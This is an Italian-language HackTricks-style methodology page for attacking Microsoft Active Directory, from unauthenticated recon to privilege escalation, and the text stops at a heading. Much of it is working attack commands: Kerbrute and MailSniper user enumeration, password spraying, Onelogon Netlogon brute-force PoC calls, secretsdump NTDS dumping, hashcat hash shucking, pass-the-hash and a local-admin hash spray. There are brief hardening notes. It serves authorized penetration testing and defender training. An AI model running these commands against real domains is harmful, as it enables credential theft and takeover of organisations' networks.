# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, consentendo agli **network administrators** di creare e gestire in modo efficiente **domains**, **users** e **objects** all'interno di una rete. È progettato per scalare, facilitando l'organizzazione di un ampio numero di utenti in **groups** e **subgroups** gestibili, controllando al contempo i **access rights** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domains**, **trees** e **forests**. Un **domain** comprende una raccolta di oggetti, come **users** o **devices**, che condividono un database comune. Le **trees** sono gruppi di questi domain collegati da una struttura condivisa, mentre una **forest** rappresenta la raccolta di più trees, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Specifici diritti di **access** e **communication** possono essere assegnati a ciascuno di questi livelli.

I concetti chiave all'interno di **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica entità all'interno della directory, inclusi **users**, **groups** o **shared folders**.
3. **Domain** – Funziona come contenitore per gli oggetti della directory, con la possibilità per più domain di coesistere all'interno di una **forest**, ciascuno mantenendo la propria raccolta di oggetti.
4. **Tree** – Un raggruppamento di domain che condividono un domain root comune.
5. **Forest** – Il culmine della struttura organizzativa in Active Directory, composta da diverse trees con **trust relationships** tra loro.

**Active Directory Domain Services (AD DS)** comprende una gamma di servizi fondamentali per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi comprendono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **users** e **domains**, incluse le funzionalità di **authentication** e **search**.
2. **Certificate Services** – Supervisiona la creazione, distribuzione e gestione di **digital certificates** sicuri.
3. **Lightweight Directory Services** – Supporta applicazioni abilitate alla directory tramite il **LDAP protocol**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare gli utenti su più applicazioni web in una singola sessione.
5. **Rights Management** – Aiuta a proteggere materiale coperto da copyright regolando la distribuzione e l'uso non autorizzati.
6. **DNS Service** – Fondamentale per la risoluzione dei **domain names**.

Per una spiegazione più dettagliata, vedi: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come **attack an AD** devi **understand** molto bene il **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Puoi trovare molto su [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una rapida panoramica dei comandi che puoi eseguire per enumerare/exploitare un AD.

> [!WARNING]
> La comunicazione Kerberos **requires a full qualifid name (FQDN)** per eseguire azioni. Se provi ad accedere a una macchina tramite l'indirizzo IP, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Se hai solo accesso a un ambiente AD ma non hai credenziali/sessioni, potresti:

- **Pentest the network:**
- Scansionare la rete, trovare macchine e porte aperte e provare a **exploit vulnerabilities** o **extract credentials** da esse (per esempio, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerare DNS potrebbe fornire informazioni su server chiave nel domain come web, printers, shares, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla generale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) per trovare ulteriori informazioni su come farlo.
- **Check for null and Guest access on smb services** (questo non funzionerà sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB si può trovare qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP si può trovare qui (presta **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Raccogli credenziali [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedi all'host abusando del [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogli credenziali **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrai username/names da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti del domain e anche da quelli pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti dell'azienda, potresti provare diverse convenzioni di **username AD (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3letters di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Controlla le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesta un'**invalid username** il server risponderà usando il codice di errore **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permettendoci di determinare che lo username non era valido. Gli **valid usernames** provocheranno o il **TGT in a AS-REP** response oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente deve eseguire la pre-autenticazione.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo il binding dell'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca si può trovare [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se trovi uno di questi server nella rete puoi anche eseguire **user enumeration** contro di esso. Per esempio, puoi usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare liste di username in [**questo github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano nell'azienda** dallo step di recon che avresti dovuto eseguire prima di questo. Con nome e cognome potresti usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali username validi.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Anche dopo che **Zerologon** è stato patchato sul DC, gli account esplicitamente inseriti nella allow-list possono ancora essere esposti al comportamento **legacy/vulnerable Netlogon secure-channel**. La configurazione rischiosa è la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oppure il valore di registro corrispondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Quel valore è un **descrittore di sicurezza SDDL** (vedi [Security Descriptors](security-descriptors.md)). Qualsiasi account o gruppo a cui sia concessa la ACE rilevante nella DACL può essere preso di mira. Per esempio, `O:BAG:BAD:(A;;RC;;;WD)` inserisce effettivamente nella allow-list **Everyone**.

Workflow pratico dell'operatore:

1. **Identifica i principal nella allow-list** controllando sia **SYSVOL/GPO** sia il **registro live del DC**.
2. **Risolvi i SID** trovati nell'SDDL in veri utenti/computer AD e dai priorità agli **account macchina dei DC**, **account di trust** e altri macchine privilegiate.
3. Prova ripetutamente l'**autenticazione MS-NRPC / Netlogon** come account presente nella allow-list.
4. Dopo un guess riuscito, abusa del **Netlogon password-setting** per reimpostare la password dell'account target (il PoC pubblico la imposta a una stringa vuota).

Quick triage / lab examples from the public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- Lo **scanner** è utile perché la allow-list effettiva può esistere in **SYSVOL**, nel **registry**, o in entrambi.
- Il percorso di exploit stesso è importante perché **non richiede privilegi di Domain Admin** una volta identificato un account vulnerabile.
- Compromettere un account macchina di **Domain Controller** come `DC$` è particolarmente pericoloso perché il reset di quella password può abilitare direttamente percorsi più ampi di **AD takeover**.
- La fattibilità del **brute-force** dipende dalla modalità: l'artefatto pubblico descrive un approccio meet-in-the-middle, un brute force a **24 bit** quando è disponibile un altro computer account, e varianti più lente a **32 bit**.

Detection / hardening notes:

- Verifica la policy della allow-list e rimuovi tutto tranne eccezioni di compatibilità temporanee ed esplicitamente richieste.
- Monitora gli eventi DC **System** **5827/5828/5829/5830/5831** per intercettare connessioni Netlogon vulnerabili che vengono negate, rilevate o esplicitamente consentite dalla policy.
- Tratta gli account in `VulnerableChannelAllowList` come **high-risk** finché la dipendenza legacy non viene rimossa.

### Knowing one or several usernames

Ok, quindi sai di avere già un username valido ma nessuna password... Allora prova:

- [**ASREPRoast**](asreproast.md): Se un utente **non ha** l'attributo _DONT_REQ_PREAUTH_ puoi **richiedere un messaggio AS_REP** per quell'utente che conterrà alcuni dati cifrati tramite una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): Proviamo le password più **comuni** con ciascuno degli utenti scoperti, magari qualche utente usa una password debole (tieni presente la password policy!).
- Nota che puoi anche **sprayare i server OWA** per provare a ottenere accesso ai mail server degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti essere in grado di **ottenere** alcuni challenge **hashes** da crackare avvelenando (**poisoning**) alcuni protocolli della **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più email e una migliore comprensione della network**. Potresti essere in grado di forzare **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  per ottenere accesso all'ambiente AD.

### NetExec workspace-driven recon & relay posture checks

- Usa i **workspace `nxcdb`** per mantenere lo stato della recon AD per ogni engagement: `workspace create <name>` avvia database SQLite per-protocollo sotto `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vista con `proto smb|mssql|winrm` ed elenca i secret raccolti con `creds`. Rimuovi manualmente i dati sensibili quando hai finito: `rm -rf ~/.nxc/workspaces/<name>`.
- La discovery rapida della subnet con **`netexec smb <cidr>`** mostra **domain**, **OS build**, requisiti di **SMB signing** e **Null Auth**. I membri che mostrano `(signing:False)` sono **relay-prone**, mentre i DC spesso richiedono signing.
- Genera i **hostname in /etc/hosts** direttamente dall'output di NetExec per facilitare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando il relay SMB verso il DC è bloccato dalla signing, controlla comunque la postura LDAP: `netexec ldap <dc>` evidenzia `(signing:None)` / weak channel binding. Un DC con SMB signing required ma LDAP signing disabled resta un target valido per **relay-to-LDAP** per abusi come **SPN-less RBCD**.

### Leak di credenziali printer lato client → validazione bulk delle credenziali di dominio

- Le interfacce printer/web a volte **incorporano password admin mascherate in HTML**. Visualizzando source/devtools puoi rivelare il cleartext (per esempio, `<input value="<password>">`), consentendo l’accesso Basic-auth per fare scan/print dei repository.
- I print job recuperati possono contenere **documenti di onboarding in plaintext** con password per singolo utente. Mantieni gli abbinamenti allineati quando testi:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** con l’**utente null o guest** potresti **posizionare file** (come un file SCF) che, se in qualche modo vengono aperti, **attiveranno un’autenticazione NTLM verso di te** così puoi **steal** la **NTLM challenge** per crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** considera ogni NT hash che possiedi già come un password candidate per altri formati più lenti il cui materiale di chiave deriva direttamente dall’NT hash. Invece di brute-forcing lunghe passphrase in Kerberos RC4 tickets, NetNTLM challenges, o cached credentials, alimenti Hashcat con gli NT hash nelle modalità NT-candidate e lasci che verifichi il riuso della password senza mai conoscere il plaintext. Questo è particolarmente potente dopo un domain compromise, quando puoi raccogliere migliaia di NT hash attuali e storici.

Usa shucking quando:

- Hai un corpus di NT da DCSync, dump SAM/SECURITY, o credential vaults e devi testare il riuso in altri domains/forests.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM, o blob DCC/DCC2.
- Vuoi dimostrare rapidamente il riuso per passphrase lunghe e non crackable e pivotare subito via Pass-the-Hash.

La tecnica **non funziona** contro encryption types le cui chiavi non sono l’NT hash (per esempio, Kerberos etype 17/18 AES). Se un domain impone solo AES, devi tornare alle normali password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history per prendere il set più grande possibile di NT hash (e i loro valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le entry di history ampliano moltissimo il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di harvest NTDS secrets vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae i dati locali SAM/SECURITY e i cached domain logons (DCC/DCC2). Rimuovi i duplicati e aggiungi quegli hash alla stessa lista `nt_candidates.txt`.
- **Track metadata** – Tieni traccia di username/domain che hanno prodotto ogni hash (anche se la wordlist contiene solo hex). Gli hash corrispondenti ti dicono subito quale principal sta riusando una password una volta che Hashcat stampa il winning candidate.
- Preferisci candidate dello stesso forest o di un trusted forest; massimizza la probabilità di overlap durante lo shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- Gli input NT-candidate **devono rimanere raw 32-hex NT hash**. Disabilita i rule engines (niente `-r`, niente hybrid modes) perché le modifiche corrompono il key material del candidate.
- Queste modes non sono intrinsecamente più veloci, ma il keyspace NTLM (~30,000 MH/s su un M3 Max) è ~100× più rapido di Kerberos RC4 (~300 MH/s). Testare una lista NT curata costa molto meno che esplorare l’intero password space nel formato lento.
- Esegui sempre la **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) perché le modes 31500/31600/35300/35400 sono state rilasciate di recente.
- Al momento non esiste una modalità NT per AS-REQ Pre-Auth, e gli AES etypes (19600/19700) richiedono la plaintext password perché le loro chiavi sono derivate via PBKDF2 da password UTF-16LE, non da raw NT hash.

#### Example – Kerberoast RC4 (mode 35300)

1. Cattura un TGS RC4 per uno SPN target con un user a basso privilegio (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni NT candidate e valida il blob `$krb5tgs$23$...`. Una match conferma che l’account del servizio usa uno dei tuoi NT hash esistenti.

3. Pivot immediately via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Puoi opzionalmente recuperare il plaintext più tardi con `hashcat -m 1000 <matched_hash> wordlists/` se serve.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l’utente domain interessante in `dcc2_highpriv.txt` e shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una match riuscita restituisce l’NT hash già noto nella tua lista, provando che l’utente cached sta riusando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oppure crack it in fast NTLM mode per recuperare la stringa.

Lo stesso workflow si applica alle NetNTLM challenge-responses (`-m 27000/27100`) e a DCC (`-m 31500`). Una volta identificata una match puoi avviare relay, SMB/WMI/WinRM PtH, oppure re-crack the NT hash con masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credenziali o una sessione di un domain account valido.** Se hai credenziali valide o una shell come domain user, **devi ricordare che le opzioni viste prima restano opzioni per compromettere altri users**.

Prima di iniziare l’enumeration autenticata dovresti conoscere il **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Aver compromesso un account è un **grande passo per iniziare a compromettere l’intero domain**, perché potrai iniziare la **Active Directory Enumeration:**

Per quanto riguarda [**ASREPRoast**](asreproast.md) ora puoi trovare ogni possibile user vulnerabile, e per quanto riguarda [**Password Spraying**](password-spraying.md) puoi ottenere una **lista di tutti gli username** e provare la password dell’account compromesso, password vuote e nuove password promettenti.

- Potresti usare il [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell for recon**](../basic-powershell-for-pentesters/index.html) che sarà più stealthy
- Puoi anche [**use powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro tool eccellente per la recon in un active directory è [**BloodHound**](bloodhound.md). Non è **molto stealthy** (dipende dai collection methods che usi), ma **se non ti interessa** dovresti assolutamente provarlo. Trova dove gli users possono RDP, trova path verso altri groups, ecc.
- **Altri automated AD enumeration tools sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) perché potrebbero contenere informazioni interessanti.
- Un **tool con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** della suite **SysInternal**.
- Puoi anche cercare nel database LDAP con **ldapsearch** per trovare credenziali nei campi _userPassword_ e _unixUserPassword_, o persino in _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se stai usando **Linux**, puoi anche enumerare il domain usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Potresti anche provare tool automatizzati come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

È molto facile ottenere tutti gli username del domain da Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oppure `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione Enumeration sembra piccola è la parte più importante di tutte. Apri i link (soprattutto quelli di cmd, powershell, powerview e BloodHound), impara come enumerare un domain e fai pratica finché ti senti a tuo agio. Durante un assessment, questo sarà il momento chiave per trovare la strada verso DA o per decidere che non si può fare nulla.

### Kerberoast

Kerberoasting consiste nell’ottenere **TGS tickets** usati da servizi collegati ad account utente e crackarne la crittografia — che si basa sulle password degli utenti — **offline**.

Di più su questo qui:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute alcune credenziali puoi verificare se hai accesso a qualche **machine**. A questo scopo, puoi usare **CrackMapExec** per tentare la connessione su diversi server con vari protocolli, in base alle porte trovate nelle scansioni.

### Local Privilege Escalation

Se hai compromesso credenziali o una sessione come regular domain user e hai **access** con questo user a **any machine in the domain** dovresti provare a trovare il modo di **escalate privileges locally e looting for credentials**. Questo perché solo con i privilegi di local administrator potrai **dump hashes of other users** in memoria (LSASS) e localmente (SAM).

C’è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È **improbabile** che tu trovi dei **tickets** nell’utente corrente che ti **danno il permesso di accedere** a risorse inattese, ma potresti controllare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare l'active directory, avrai **più email e una migliore comprensione della rete**. Potresti riuscire a forzare **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Cerca Creds nelle Condivisioni del Computer | SMB Shares

Ora che hai alcune credenziali di base, dovresti controllare se riesci a **trovare** eventuali **file interessanti condivisi all'interno dell'AD**. Potresti farlo manualmente, ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti da controllare).

[**Segui questo link per saperne di più sugli strumenti che puoi usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Ruba Creds NTLM

Se puoi **accedere ad altri PC o shares**, potresti **posizionare file** (come un file SCF) che, se accessi in qualche modo, **attivano un'autenticazione NTLM verso di te** così puoi **rubare** la **NTLM challenge** per craccarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Per le seguenti tecniche un normale domain user non basta, servono privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Speriamo che tu sia riuscito a **compromettere qualche account local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) inclusi i relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [elevando i privilegi localmente](../windows-local-privilege-escalation/index.html).\
Poi, è il momento di dumpare tutti gli hash in memoria e localmente.\
[**Leggi questa pagina sulle diverse modalità per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che esegua l'**autenticazione NTLM usando** quell'**hash**, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell'**hash** dentro **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, verrà usato quell'**hash**. L'ultima opzione è quella che fa mimikatz.\
[**Leggi questa pagina per maggiori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **usare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash sul protocollo NTLM. Quindi, questo potrebbe essere particolarmente **utile in reti dove il protocollo NTLM è disabilitato** e solo **Kerberos è consentito** come protocollo di autenticazione.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nel metodo di attacco **Pass The Ticket (PTT)**, gli attacker **rubano il ticket di autenticazione di un utente** invece della sua password o dei valori hash. Questo ticket rubato viene poi usato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **local administrator**, dovresti provare a **login locally** su altri **PC** con essa.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **accedere a istanze MSSQL**, potrebbe essere in grado di usarle per **eseguire comandi** sull’host MSSQL (se in esecuzione come SA), **rubare** l’hash **NetNTLM** o persino eseguire un **relay attack**.\
Inoltre, se un’istanza MSSQL è trusted (database link) da un’altra istanza MSSQL, se l’utente ha privilegi sul database trusted, potrà **usare la relazione di trust per eseguire query anche nell’altra istanza**. Questi trust possono essere concatenati e, a un certo punto, l’utente potrebbe riuscire a trovare un database mal configurato in cui può eseguire comandi.\
**I link tra database funzionano anche attraverso forest trust.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite di inventario e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sul computer, sarai in grado di fare dump dei TGT dalla memoria di tutti gli utenti che effettuano login sul computer.\
Quindi, se un **Domain Admin effettua login sul computer**, potrai fare dump del suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti persino **compromettere automaticamente un Print Server** (speriamo che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se a un utente o computer è consentito "Constrained Delegation", potrà **impersonare qualsiasi utente per accedere ad alcuni servizi in un computer**.\
Quindi, se **comprometti l'hash** di questo utente/computer, sarai in grado di **impersonare qualsiasi utente** (anche domain admin) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto abilita l'ottenimento dell'esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su alcuni oggetti di dominio** che potrebbero permetterti di **muoverti** lateralmente/**escalare** privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Scoprire un **servizio Spool in ascolto** all'interno del dominio può essere **abusato** per **ottenere nuove credenziali** ed **escalare privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

